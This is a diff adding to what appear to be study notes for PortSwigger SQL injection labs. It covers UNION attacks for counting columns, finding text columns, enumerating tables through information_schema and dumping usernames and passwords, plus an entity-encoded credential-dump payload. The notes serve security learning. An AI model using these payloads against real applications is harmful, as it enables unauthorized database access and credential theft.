@@ -96,6 +96,88 @@ UNION SELECT NULL,NULL--
 
 **Lab: SQL injection UNION attack, determining the number of columns returned by the query**
 
+Injection vulnerability in the product category filter, use a UNION to determine the required number of columns to return
+
+Inject a UNION into the category query string:
+
+```
+'+UNION+SELECT+NULL,NULL--
+```
+
+### Finding columns with a useful data type
+
+Determine if a column is a string by replacing the NULL in each index with a dummy string:
+
+```
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+```
+
+**Lab: SQL injection UNION attack, finding a column containing text**
+
+Injection vulnerability in the product category filter, use a UNION attack to identify columns that contain string data
+
+```
+'+UNION+SELECT+'string to retrieve',NULL,NULL--
+'+UNION+SELECT+NULL,'string to retrieve',NULL--
+'+UNION+SELECT+NULL,NULL,'string to retrieve'--
+```
+
+### Using a SQL injection UNION attack to retrieve interesting data
+
+**Lab: SQL injection UNION attack, retrieving data from other tables**
+
+Injection vulnerability in the product category filter, use a UNION attack to retrieve data from other tables
+
+We're given the users table name but if we weren't we can do this:
+
+```sql
+--Find out how many columns we need
+UNION SELECT NULL,NULL--
+--Dump table names
+UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
+--Dump column names
+UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE TABLE_NAME='user table name'--
+--Dump data we want
+UNION SELECT username,password FROM users--
+```
+
+### Retrieving multiple values within a single column
+
+When we need to retrieve multiple values but only have a single column we can work with we can use string concatenation
+
+| Database | Syntax |
+|----------|--------|
+| Oracle | `'foo'||'bar'` |
+| Microsoft | `'foo'+'bar'` |
+| PostgreSQL | `'foo'||'bar'` |
+| MySQL | `'foo' 'bar'`, `CONCAT('foo','bar')` |
+
+**Lab: SQL injection UNION attack, retrieving multiple values in a single column**
+
+Injection vulnerability in the product category filter, use a UNION attack to retrieve username and password values in one column
+
+Determine number of columns:
+
+```
+'+UNION+SELECT+NULL,NULL--
+```
+
+Determine column holding string data:
+
+```
+'+UNION+SELECT+'a',NULL--
+'+UNION+SELECT+NULL,'a'--
+```
+
+Concatenate and dump username and passwords:
+
+```
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+```
+
 ## Blind SQl injection vulnerabilities
 
 The application returns no results from the query, use the following:
@@ -105,6 +187,10 @@ The application returns no results from the query, use the following:
 - Trigger out-of-band network interaction using OAST techniques
 
 More info: https://portswigger.net/web-security/sql-injection/blind
+
+### Exploiting blind SQL injection by triggering conditional responses
+
+Tracking cookie is injectable, server returns a Welcome Back message if the query returns any rows. Exploit the blind SQLi vulnerability to find the administrator password
 
 ## Second-order SQL injection AKA Stored SQL injection
 
@@ -280,6 +366,3 @@ Encoded:
 ```
 &#x31;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x20;&#x7C;&#x7C;&#x20;&#x27;&#x7E;&#x27;&#x20;&#x7C;&#x7C;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4F;&#x4D;&#x20;&#x55;&#x53;&#x45;&#x52;&#x53;
 ```
-
-Python util for escaping characters https://docs.python.org/3/library/xml.sax.utils.html
-
